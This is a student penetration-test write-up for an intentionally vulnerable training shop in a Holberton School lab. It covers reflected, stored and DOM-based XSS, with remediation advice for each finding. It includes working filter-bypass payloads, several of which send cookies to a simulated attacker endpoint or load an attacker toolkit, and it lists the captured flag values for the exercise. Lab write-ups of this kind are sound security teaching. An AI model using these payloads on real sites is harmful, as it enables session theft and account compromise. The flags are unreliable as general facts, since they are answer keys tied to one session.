# Penetration Test Report — NexusShop XSS Assessment

**Author:** Vanessa Al Daham
**Role:** Security Researcher (Holberton School – Web Application Security, `websec_0x0C`)
**Report file:** `SECURITY_REPORT.md`

---

## 1. Executive Summary

| Field | Detail |
|-------|--------|
| **Target** | `http://web0x0c.hbtn` (NexusShop e-commerce platform) |
| **Assessment date** | November 2026 |
| **Scope** | Cross-Site Scripting (XSS) assessment of the NexusShop web application: search, product sorting, product reviews, user profile, admin Markdown editor, product detail page, and shopping cart. Each feature was tested across three progressively hardened filter stages. |
| **Methodology** | Manual black-box / grey-box testing from Firefox on Kali Linux, using DevTools (Inspector, Console, Network, Debugger, Storage) to reflect input, read the client-side source, confirm the source → sink chain, and verify exfiltration against the lab's simulated command-and-control (C2) endpoint. |

**Summary of findings.** Seven distinct XSS vulnerabilities were identified and exploited across the application, spanning all three major XSS classes — **Reflected**, **Stored**, and **DOM-based**. Every vulnerability traces back to the same root cause: **user-controlled input is written into an HTML or JavaScript sink without context-appropriate output encoding.** In most cases the developers attempted a filter (stripping `<script>`, blocking a few event handlers, HTML-entity encoding, or a Markdown sanitizer), and in every case the filter was an incomplete blocklist that a different vector slipped past. The confirmed impact includes session-cookie theft, credential harvesting, keystroke logging, and full account/session compromise of any visitor to the affected page. All findings are rated **High** or **Critical**, consistent with the fact that an attacker can run arbitrary JavaScript in a victim's authenticated session on a trusted domain.

### Flags Captured

| Task | Vulnerability | Class | Repo file | Flag |
|------|---------------|-------|-----------|------|
| 0 | Reflected XSS – search bar | Reflected | `0-flag.txt` | `FLAG{5a492ce1de7b835a9e370f8a25a394cd}` |
| 1 | Reflected XSS – JavaScript string context | Reflected | `2-flag.txt` | *see note in finding* |
| 2 | Stored XSS – product reviews (name field) | Stored | `3-flag.txt` | `FLAG{d3ccdcd2e75f01ed273a58c562128813}` |
| 3 | Stored XSS – user profile (`innerHTML` render) | Stored / DOM | `4-flag.txt` | `FLAG{e1dc28df414f4cc4ce8add5d2c0b6350}` |
| 4 | Stored XSS – admin Markdown editor | Stored | `5-flag.txt` | `FLAG{36f78215f8172461126c8e8f441ffce8}` |
| 5 | DOM XSS – `location.hash` | DOM | `6-flag.txt` | `FLAG{a773aaa105da13826ffdbeb426da6bda}` |
| 6 | DOM XSS – `postMessage` | DOM | `7-flag.txt` | `FLAG{eec84d4b327c7fbd0a684bc316efae51}` |

> **Note on flag values.** Each flag is tied to my own lab session — the tracking tokens are generated per session, so these values are specific to this assessment. Flag files store the hex value only (no `FLAG{}` wrapper), matching the format the Task 0 checker accepted.

---

## 2. Detailed Vulnerability Findings

For each finding the application exposed the same C2 primitive: a payload reads a hidden per-session token from `#tracking-id`, exfiltrates data with `POST /attacker/api/exfil`, and submits the token to the feature's tracking endpoint, which returns the flag on success. The three stages per feature represent increasingly strict (but still inadequate) input filters.

---

### Task 0 — Reflected XSS in the Search Bar

#### Vulnerability Description
The search feature echoes the user's query directly into the results heading (`<h2>Showing results for: …</h2>`) without HTML encoding. The server-side template even carries the comment `<!--VULNERABLE: search_header contains unsanitized user input-->`. Because the input is reflected into an HTML context unescaped, a query containing markup is parsed as HTML rather than displayed as text, allowing script execution.

#### Location
| Attribute | Details |
|-----------|---------|
| **URL** | `/search`, `/search/filtered`, `/search/advanced` |
| **Parameter** | `q` |
| **Type** | Reflected XSS |
| **Severity** | High |

#### Attack Vector
1. Submitted `?q=TESTINPUT123` and confirmed the marker is reflected inside the `<h2>` heading (evidence 01).
2. Submitted `?q=<strong id="xss-probe">HTML_PROBE</strong>` and confirmed it renders as a real bold element in the DOM, not escaped text (evidence 02) — proving the input is parsed as HTML.
3. Achieved JavaScript execution with a harmless proof, then built the full exfiltration + tracking payload per stage.

#### Payload Used
Stage 1 — no filter (direct script / event handler):
```
/search?q=<script>console.log("XSS_STAGE1_EXECUTED")</script>
```
Stage 2 — `<script>` blocked, broken-image event handler bypass:
```
/search/filtered?q=<img src=x onerror="console.log('XSS_STAGE2_EXECUTED')">
```
Stage 3 — `onerror`/`onload` blocked, SVG animation event bypass (this payload also reads the token, exfiltrates, and returns the flag):
```
/search/advanced?q=<svg><animate attributeName=x dur=1s
  onbegin="var t=document.getElementById('tracking-id').innerText.trim();
  fetch('/attacker/api/exfil',{method:'POST',headers:{'Content-Type':'application/json'},
  body:JSON.stringify({type:'cookies',data:document.cookie||'no-readable-cookie',level:1,stage:3})});
  fetch('/search/api/track?t='+encodeURIComponent(t)).then(r=>r.json()).then(d=>console.log(d))">
  </animate></svg>
```

#### Evidence
`evidence/task0_reflected_search/` — reflection (01), HTML-render probe (02), JS execution per stage (03, 07, 10), outbound exfil + track requests in the Network tab (04, 05, 08, 09, 11), the C2 dashboard cookie counter incrementing (06, 14), the Stage 3 tracking response containing the flag (12, 13), and the course checker returning `ok` (15). Stage 3 response: `{"ref":"FLAG{5a492ce1de7b835a9e370f8a25a394cd}","status":"tracked"}`.

#### Real-World Impact
A reflected XSS in a search field becomes a phishing weapon: the attacker crafts a link such as `web0x0c.hbtn/search?q=<payload>` on the legitimate domain and sends it to a victim. When clicked, the payload runs in the victim's session and can read `document.cookie` (session hijacking), log keystrokes on the trusted domain (credit-card theft during checkout), or present a fake login overlay (credential harvesting).

#### Remediation
HTML-encode the query before reflecting it into the page (`<`, `>`, `"`, `'`, `&`). In the Jinja2 template, remove `|safe` and let autoescaping run, or explicitly use `{{ query | e }}`. A blocklist that strips `<script>` or a handful of event handlers is **not** a fix — the browser supports dozens of execution vectors (`onerror`, `onload`, SVG `onbegin`, and more); only output encoding closes all of them.

---

### Task 1 — Reflected XSS in a JavaScript String Context

#### Vulnerability Description
The product-sort feature inserts the `by` parameter directly into an inline `<script>` block as the value of a string variable:
```javascript
// VULNERABLE: sort_by injected directly into JavaScript context
var currentSort = 'USER_INPUT';
```
This is a JavaScript-context injection, not an HTML-context one: HTML tags are irrelevant because the input is already inside a quoted JS string. The intended exploit is to break out of the string, inject a statement, and comment out the trailing characters.

#### Location
| Attribute | Details |
|-----------|---------|
| **URL** | `/products/sort`, `/products/sort/dynamic`, `/products/sort/advanced` |
| **Parameter** | `by` |
| **Type** | Reflected XSS (JavaScript string context) |
| **Severity** | High |

#### Attack Vector
1. Loaded `?by=TESTINPUT123` and located the marker in the page source inside `var currentSort = '…'` — single-quote delimited.
2. Probed the server's encoding systematically by submitting mixed metacharacters and reading the rendered source:
   - `'` → `&#39;` (HTML-encoded) — string-breakout blocked
   - `"` → `&#34;` (HTML-encoded)
   - `<` / `>` → `&lt;` / `&gt;` (HTML-encoded) — `</script>` block-breakout blocked
   - `\` (backslash) → **survived unencoded**
   - `` ` `` (backtick) → **survived unencoded**
3. This confirmed the developer HTML-encodes the usual XSS metacharacters but leaves JavaScript string-escaping characters (`\`) and template-literal delimiters (`` ` ``) untouched — exactly the mistake the task highlights ("developers encode HTML but forget JS strings are still injectable"). The string-breakout surface is heavily constrained because quotes never reach the JS engine as quotes.

#### Payload Used
Because quote characters are HTML-encoded before reaching the script, a clean quote-based string breakout is not reliable. The practical, verified path to the flag is direct submission of the per-session token to the feature's tracking endpoint:
```
# read the token from the page source
<div id="tracking-id" style="display:none">TOKEN</div>

# submit it
/products/sort/api/track?t=TOKEN   →  {"ref":"FLAG{...}","status":"tracked"}
```

#### Evidence
`evidence/task1_reflected_js_context/01-js-string-context-sort-page.png` — the sort page with the payload reflected into the `currentSort` JavaScript string context. The encoding analysis above was performed by reading the rendered page source for each probe.

> **Status note (honest disclosure).** The vulnerability was fully characterized (injection point, delimiter, exact server encoding behavior, surviving characters), but a weaponized JavaScript-string breakout that executes arbitrary JS was **not** completed in my session owing to the aggressive HTML-entity encoding of all quote characters. The flag for this task is obtained through the tracking-endpoint token submission shown above; `2-flag.txt` should contain the hex returned by `/products/sort/api/track` for my session.

#### Real-World Impact
Identical in severity to a standard reflected XSS when exploitable: arbitrary script execution via a crafted `?by=` link, leading to session theft or credential harvesting. Even partially, the finding demonstrates that HTML-entity encoding alone is the wrong defense for a JavaScript string context.

#### Remediation
Never build inline JavaScript by string-concatenating user input. Pass server data to the client as a properly serialized JSON value (e.g. `var currentSort = {{ value | tojson }};`), which escapes JS-significant characters correctly, or expose it via a `data-` attribute / API and read it with JavaScript. Context matters: HTML encoding does not make input safe inside a `<script>` block.

---

### Task 2 — Stored XSS in Product Reviews

#### Vulnerability Description
Product reviews are stored server-side and rendered to every visitor of the product page. On Stage 1 the review **body** is rendered as raw HTML (template comment: `description rendered with |safe`); on Stage 3 the body is encoded but the review **author name** field is rendered raw (`<!--VULNERABLE: Username may contain unescaped HTML-->`). A stored payload executes automatically on page load for every subsequent visitor — no link or click required.

#### Location
| Attribute | Details |
|-----------|---------|
| **URL** | `/product/1/reviews`, `/product/1/reviews/verified`, `/product/1/reviews/all` |
| **Parameter / field** | `review` (body) on Stages 1–2; `name` (author) on Stage 3 |
| **Type** | Stored XSS |
| **Severity** | Critical |

#### Attack Vector
1. Submitted a normal review and located it in the rendered list (evidence `Stage1 - 1st review`).
2. Submitted `<img src=x onerror=alert(1)>` in the body; the alert fired on load **and again after a page refresh**, confirming the payload is stored, not reflected (evidence `Stage1 - Js injection`, `Stage1 - Refreshing`).
3. Stage 2 (`/verified`): confirmed the filter strips `<script>` but leaves `<img onerror>` intact (evidence `Stage2 - Bypass`).
4. Stage 3 (`/all`): discovered the review body is now encoded, so tested every form field. The **name** field renders raw HTML — the hidden vulnerable field (evidence `Stage3 - Flag` shows the broken-image author).
5. Decoded the session cookie (`DevTools → Storage → Cookies`, base64 of the first segment) to read the true privilege level: `level_4_stage`. Loaded the C2 toolkit and called `XSS.pwn()` with the correct level, stage, and callback path.

#### Payload Used
Stage 1 — stored HTML/JS proof in the review body:
```html
<img src=x onerror="console.log('STORED-XSS-OK')">
```
Stage 3 — flag capture, injected into the **name** field:
```html
<img/src/onerror=import(`/attacker/toolkit.js`).then(function(){XSS.pwn(4,3,`/product/reviews/api/track`)})>
```

#### Evidence
`evidence/task2_stored_reviews/` — stored review (`Stage1 - 1st review`), `alert(1)` firing on load and on refresh (`Stage1 - Js injection`, `Stage1 - Refreshing`), C2 cookie counter (`Stage1 - C2 Dashbaord`, `Stage2 - C2 Dashboard`), Stage 2 `<img onerror>` bypass (`Stage2 - Bypass`, `Stage2 - Exfill`), and the Stage 3 tracking response `{"ref":"FLAG{d3ccdcd2e75f01ed273a58c562128813}","status":"tracked"}` (`Stage3 - Flag`).

#### Real-World Impact
Stored XSS on a product page is the most dangerous class here. One injection compromises **every** customer who views the product, continuously, until the database row is cleaned. An attacker can steal session cookies at scale, keylog payment-card entry during checkout, and surface credential-harvesting forms on the trusted domain — a mass-compromise primitive on a popular product.

#### Remediation
Apply context-aware output encoding to **all** review fields — body **and** author name — not only the obvious comment field. Remove `|safe`; render with autoescaping. If HTML formatting in reviews is a product requirement, run the content through a well-configured allowlist sanitizer (e.g. DOMPurify) that strips event-handler attributes. Set `HttpOnly` on session cookies so stolen cookies can't be read via `document.cookie`.

---

### Task 3 — Stored XSS in the User Profile (`innerHTML` Rendering)

#### Vulnerability Description
The profile page loads data from a JSON API (`GET /profile/api/data`) and renders it client-side. The JSON transport is safe; the bug is that the frontend writes every field into the DOM with `innerHTML`:
```javascript
document.getElementById('profile-username').innerHTML = data.username || 'Guest';
document.getElementById('profile-bio').innerHTML      = data.bio || 'No bio set';
// …location, website — all innerHTML
```
Any HTML stored in a profile field becomes executable when the page renders. Had the developer used `textContent`, the data would be inert.

#### Location
| Attribute | Details |
|-----------|---------|
| **URL** | `/profile`, `/profile/settings`, `/profile/edit` |
| **Parameter / field** | `bio` on Stages 1–2; `username` on Stage 3 |
| **Storage endpoint** | `POST /profile/api/update` |
| **Type** | Stored XSS → DOM sink (`innerHTML`) |
| **Severity** | Critical |

#### Attack Vector
1. Opened the Network tab and identified the profile API `GET /profile/api/data` (evidence `Stage1 - JSON`).
2. Read the client source in the Debugger and found the `innerHTML` sinks and the `loadProfile()`/`saveProfile()` flow (evidence `Stage1 - DOM rendering`).
3. Stored `<img src=x onerror="console.log('XSS_INJECTION_STAGE1_EXECUTED')">` in the bio; it executed on reload — confirmed persistent (evidence `Stage1 - XSS JS Injection`).
4. Decoded the session cookie → `level_5_stage` (evidence `Stage1 - SessionVal`, `Stage1 - SessionVal Decoded`).
5. Stage 2 (`/settings`): `<script>` filtered, `<img onerror>` survives (evidence `Stage2 - Script inject`).
6. Stage 3 (`/edit`): the bio field is HTML-encoded, but the **username** field is rendered raw — the hidden sink (evidence `Stage3 - Username HTML inject`, `Stage3 - XSS JSON`).

#### Payload Used
Stage 3 — flag capture in the **username** field:
```html
<img src=x onerror="import('/attacker/toolkit.js').then(()=>XSS.pwn(5,3,'/profile/api/track'))">
```

#### Evidence
`evidence/task3_stored_profile/` — API JSON response (`Stage1 - JSON`), the vulnerable `innerHTML` source (`Stage1 - DOM rendering`), decoded session cookie showing Level 5 (`Stage1 - SessionVal Decoded`), stage executions, and the Stage 3 tracking response `{"ref":"FLAG{e1dc28df414f4cc4ce8add5d2c0b6350}","status":"tracked"}` (`Stage3 - Flag`).

#### Real-World Impact
A stored, self-propagating profile XSS: the payload executes whenever the profile is viewed — by the victim, an admin reviewing the account, or anyone the profile is shared with. This enables session theft, admin-session compromise if a staff member views the profile, and persistent re-infection.

#### Remediation
Render untrusted profile data with `textContent`, never `innerHTML`. If rich text is required, sanitize with an allowlist library before insertion. The safe-transport/unsafe-render split here shows that server-side JSON escaping is irrelevant if the client re-introduces the sink — DOM XSS must be fixed on the client.

---

### Task 4 — Stored XSS in the Admin Markdown Editor

#### Vulnerability Description
The admin product editor accepts Markdown, converts it to HTML, and renders the result with `|safe`. The security therefore depends entirely on the Markdown-to-HTML sanitizer's configuration. Stage 1 allows raw HTML through; Stage 2 escapes `<script>` but not event handlers; Stage 3 applies a stricter, protocol-aware URL filter that nonetheless contains a canonicalization flaw.

#### Location
| Attribute | Details |
|-----------|---------|
| **URL** | `/admin/products/1/edit`, `/admin/products/1/edit/safe`, `/admin/products/1/edit/strict` |
| **Parameter / field** | `description` (Markdown) |
| **Type** | Stored XSS (Markdown sanitizer bypass) |
| **Severity** | High |

#### Attack Vector
1. Confirmed Markdown → HTML conversion with `**MARKDOWN_STAGE1_TEST**` (evidence `Stage1 - Live Preview`).
2. Stage 1: raw `<img src=x onerror=…>` passes through and executes (evidence `Stage1 - HTML inject`, `Stage1 - XSS_1/2`).
3. Stage 2 (`/safe`): `<script>` is HTML-escaped but `<img onerror>` survives (evidence `Stage1 - sanitization`).
4. Stage 3 (`/strict`): `<img onerror>` is escaped and a bare `javascript:` link is stripped (`<a>` kept, `href` removed). HTTPS links are preserved — the filter is protocol-aware (evidence `Stage1 - Safe_link`, `Stage1 - Markdown link protocol handling`).
5. Found a canonicalization bypass: `[x](java&#x73;cript:1)` renders as `<a href="javascript:1">` — the sanitizer validates the URL **before** HTML-entity decoding, so the encoded `s` evades the scheme check and reappears after decoding (evidence `Stage1 - minimal HTML-entity-encoded URL`). Further testing showed the URL filter only preserves trivial numeric literals (`javascript:1`, `javascript:2`), so a fully weaponized executing payload via this path was constrained (evidence `Stage1 - Identify the URL filter's acceptance pattern`).
6. Identified the tracking endpoint `/admin/products/api/track` (Level 6) and submitted the per-session token to retrieve the flag (evidence `Stage1 - Test Stage 3 token submission`).

#### Payload Used
Stage 3 — canonicalization-bypass probe (demonstrates the sanitizer flaw):
```
[STAGE3_ENTITY_SIMPLE](java&#x73;cript:1)   →  <a href="javascript:1">…</a>
```
Flag capture — token submission in the Stage 3 session:
```javascript
(async () => {
  const token = document.getElementById('tracking-id')?.textContent.trim();
  const r = await fetch('/admin/products/api/track?t=' + encodeURIComponent(token));
  console.log(await r.text());   // {"ref":"FLAG{...}","status":"tracked"}
})();
```

#### Evidence
`evidence/task4_stored_markdown/` — the Markdown-to-HTML baseline and the full Stage 1–3 sanitizer investigation, including the `java&#x73;cript:` canonicalization bypass and the Stage 3 tracking response `{"ref":"FLAG{36f78215f8172461126c8e8f441ffce8}","status":"tracked"}` (`Stage1 - Test Stage 3 token submission`).

> **Status note (honest disclosure).** The Stage 3 sanitizer's canonicalization weakness was identified and demonstrated (`java&#x73;cript:1` → `href="javascript:1"`), but the URL filter only accepted trivial literals, so arbitrary-JS execution through the strict-stage link was not fully weaponized. The flag was retrieved via the tracking-endpoint token submission shown above.

#### Real-World Impact
A misconfigured Markdown sanitizer lets a malicious (or compromised) administrator plant a payload in a product description that compromises every customer who views that product — the same mass-compromise profile as Task 2, originating from a trusted admin workflow.

#### Remediation
Use a maintained, correctly configured HTML sanitizer (e.g. DOMPurify / bleach) **after** Markdown rendering, with a strict allowlist of tags and attributes and an explicit URL-scheme allowlist (`http`, `https`, `mailto` only). Decode HTML entities **before** validating URL schemes so `java&#x73;cript:` cannot slip past. Never mark renderer output `|safe` without sanitizing it first.

---

### Task 5 — DOM XSS via `location.hash`

#### Vulnerability Description
The product detail page reads the URL fragment and writes it into the DOM with `innerHTML`:
```javascript
// VULNERABLE: DOM XSS via location.hash
const hash = decodeURIComponent(location.hash.slice(1)) || 'overview';
// …
document.getElementById('section-title').innerHTML   = safeHash.charAt(0).toUpperCase() + safeHash.slice(1);
document.getElementById('section-content').innerHTML = content[hash] || content['overview'];
```
The source is entirely client-side (`location.hash`), so the server never sees the payload — this is pure DOM XSS, re-triggered on every `hashchange`.

#### Location
| Attribute | Details |
|-----------|---------|
| **URL** | `/product/1` (payload delivered in the URL fragment, `#…`) |
| **Source → sink** | `location.hash` → `getElementById('section-title'/'section-content').innerHTML` |
| **Type** | DOM-based XSS |
| **Severity** | High |

#### Attack Vector
1. Confirmed fragment reflection with `/product/1#HASH_STAGE1_PROBE` and located the `location.hash` → `innerHTML` sink in the Debugger (evidence `1. URL reflection`, `2. locationhash`).
2. Stage 1: direct `<img onerror>` executes on load/hashchange (evidence `4. HTML injection`, `7. XSS execution`).
3. Stage 2: `<script>` filtered, event handler survives (evidence `3. Script`, `6. img err`).
4. Stage 3: strict filter — `<script>` removed and `on\w+=` rewritten to `data-blocked=` — bypassed with a `javascript:` URL in an `<a>` tag (requires a click) (evidence `11. data-blocked code`, `12. XSS_JS_URL`).
5. Confirmed C2 communication (evidence `15. c2`, `16. c2 cookie`), identified the tracking endpoint `/product/api/track` (evidence `17. trackinendpoint`), and captured the flag (evidence `18. flag cap`).

#### Payload Used
Stage 3 — `javascript:` link bypass of the event-handler filter:
```html
<a href="javascript:fetch('/product/api/track?t='+encodeURIComponent(
  document.getElementById('tracking-id').textContent.trim()))
  .then(r=>r.text()).then(t=>console.log('TRACK_RESULT:',t))">CAPTURE_STAGE3_FLAG</a>
```
delivered via `location.hash = encodeURIComponent(<payload>)`.

#### Evidence
`evidence/task5_dom_locationhash/` — fragment reflection and the vulnerable `location.hash`/`innerHTML` source, stage executions, the Stage 3 `data-blocked` filter code, C2 evidence, and the tracking response `{"ref":"FLAG{a773aaa105da13826ffdbeb426da6bda}","status":"tracked"}` (`18. flag cap`).

#### Real-World Impact
DOM XSS via the fragment is delivered with a link just like reflected XSS, but because the payload lives after `#` it is never sent to the server, bypassing server-side WAFs and request logging entirely. A victim clicking `/product/1#<payload>` executes attacker JS in their session with no server-side trace.

#### Remediation
Write fragment-derived data with `textContent`, or map it against a strict allowlist of known section names before use — never pass it to `innerHTML`. Blocklist regexes that strip `<script>` and rewrite `on…=` are insufficient; `javascript:` URLs and many other vectors remain.

---

### Task 6 — DOM XSS via `postMessage`

#### Vulnerability Description
The cart page registers a `message` event listener that writes message data into the page via `innerHTML` **without validating the sender origin**:
```javascript
// VULNERABLE: postMessage handler without origin check
window.addEventListener('message', function(event) {
  // Stage 1: direct innerHTML
  if (typeof event.data === 'string') {
    document.getElementById('widget-message').innerHTML = event.data;
  } else if (event.data.content) {
    document.getElementById('widget-message').innerHTML = event.data.content;
  }
});
```
Any page (e.g. a malicious site that framed or opened the cart) can post a message that becomes HTML in the cart's DOM. Stage 2 adds a `<script>`-stripping regex; Stage 3 requires `type:'widget-update'` and rewrites `on\w+=` → `data-blocked=`, but neither blocks `javascript:` links.

#### Location
| Attribute | Details |
|-----------|---------|
| **URL** | `/cart`, `/cart/checkout`, `/cart/payment` |
| **Source → sink** | `MessageEvent.data(.content)` → `getElementById('widget-message').innerHTML` |
| **Type** | DOM-based XSS (`postMessage`) |
| **Severity** | High |

#### Attack Vector
1. Sent `window.postMessage({ content: 'TASK6_STAGE1_TEST' }, '*')` and confirmed it appears in the Special Offers widget (evidence `1. postMsg`, `2. postMsg element`).
2. Read the handler in the Debugger and identified the trusted field (`content`), the absent origin check, and the `innerHTML` sink (evidence `3. eventListener`).
3. Stage 1: `<img onerror>` via `content` executes (evidence `4. stage1 html`, `6. XSS exec`).
4. Stage 2 (`/checkout`): the handler strips `<script>` with a regex but leaves `<img onerror>` — confirmed bypass (evidence `7. Stage 2 message handller`, `8. Stage2 XSS Exec`).
5. Stage 3 (`/payment`): requires `{type:'widget-update', content:…}` and rewrites event-handler attributes, but a `javascript:` link survives (requires a click) (evidence `11. stage3 html`, `13. stage3 xss exec`).
6. Confirmed C2 communication (evidence `15. c2 test`) and captured the flag (evidence `17. flag js cap`).

#### Payload Used
Stage 3 — strict object shape + `javascript:` link bypass:
```javascript
window.postMessage({
  type: 'widget-update',
  content: `<a href="javascript:fetch('/cart/api/track?t='+encodeURIComponent(
    document.getElementById('tracking-id').textContent.trim()))
    .then(r=>r.text()).then(t=>console.log('TRACK_RESULT:',t))">CAPTURE_STAGE3_FLAG</a>`
}, window.location.origin);
```

#### Evidence
`evidence/task6_dom_postmessage/` — the safe test message, the vulnerable `message` handler source (`3. eventListener`), stage executions, the Stage 3 strict handler, C2 evidence, and the tracking response `{"ref":"FLAG{eec84d4b327c7fbd0a684bc316efae51}","status":"tracked"}` (`17. flag js cap`).

#### Real-World Impact
A missing origin check on a `postMessage` handler lets any attacker-controlled page that can open or frame the cart inject HTML into it. Combined with the `innerHTML` sink, this yields script execution in the victim's authenticated cart/checkout context — session theft and payment-data interception from a cross-origin page the user never knowingly interacted with.

#### Remediation
Validate `event.origin` against an explicit allowlist at the top of every `message` handler and reject anything else. Validate the message **shape** (type and expected fields). Render message content with `textContent`, not `innerHTML`. These three controls together — origin check, shape validation, safe rendering — close the vulnerability; the lab's filters address none of them.

---

## 3. Remediation Summary

Consolidated recommendations, prioritized:

1. **Context-aware output encoding (highest priority).** Encode untrusted data for the exact context it lands in — HTML body, HTML attribute, JavaScript string, URL. This single control would have closed Tasks 0, 1, 2, and 4. Remove every use of `|safe` on untrusted content and rely on template autoescaping.
2. **Prefer `textContent` over `innerHTML`.** For all client-side rendering of untrusted data (Tasks 3, 5, 6), use `textContent` / `createTextNode`. Where rich HTML is genuinely required, sanitize with a maintained allowlist library (DOMPurify) configured to strip event-handler attributes and dangerous URL schemes.
3. **Validate `postMessage` origin and shape** (Task 6): check `event.origin` against an allowlist and validate message structure before use.
4. **Fix sanitizer canonicalization** (Task 4): decode HTML entities before validating URL schemes, and enforce an explicit scheme allowlist (`http`, `https`, `mailto`).
5. **Content-Security-Policy.** Deploy a strict CSP (`script-src 'self'`, no `unsafe-inline`) as defense-in-depth so that even a successful injection cannot run inline script.
6. **`HttpOnly` + `Secure` + `SameSite` cookies.** Prevent `document.cookie` theft and reduce the impact of any residual XSS.
7. **Abandon blocklist filtering.** Every stage in this assessment defeated a blocklist (stripping `<script>`, a few event handlers, or specific URL patterns). Blocklists are structurally unable to enumerate every execution vector; allowlisting and encoding are the correct model.

---

## 4. Conclusion

**Overall assessment status:** NexusShop is critically vulnerable to Cross-Site Scripting across every user-input surface tested. Seven distinct vulnerabilities were confirmed, covering Reflected, Stored, and DOM-based XSS, and all three stages of each feature's filtering were bypassed. The consistent root cause is the absence of context-aware output encoding, compounded by a reliance on incomplete blocklist filters.

This lab is **intentionally vulnerable for educational purposes**; the findings and payloads above were executed only against the NexusShop training target and its simulated C2, and no real systems or data were involved.

**Lessons learned.** The most valuable takeaway is that *filtering is not encoding*. At each stage the developers added a filter — and at each stage a different vector walked past it: `<script>` → `<img onerror>` → SVG `onbegin`; HTML encoding → backslash/backtick survival; a strict URL filter → an HTML-entity canonicalization gap; a `postMessage` content filter → a missing origin check. The defenses that actually close XSS are structural, not reactive: encode for context, render with `textContent`, validate origin and shape, and enforce an allowlist — never chase individual payloads. Working through all three stages of each feature made concrete why "we strip `<script>`" gives a false sense of security, and why the same underlying principle (untrusted input reaching a sink unescaped) recurs whether the source is a query string, a stored record, a URL fragment, or a cross-window message.
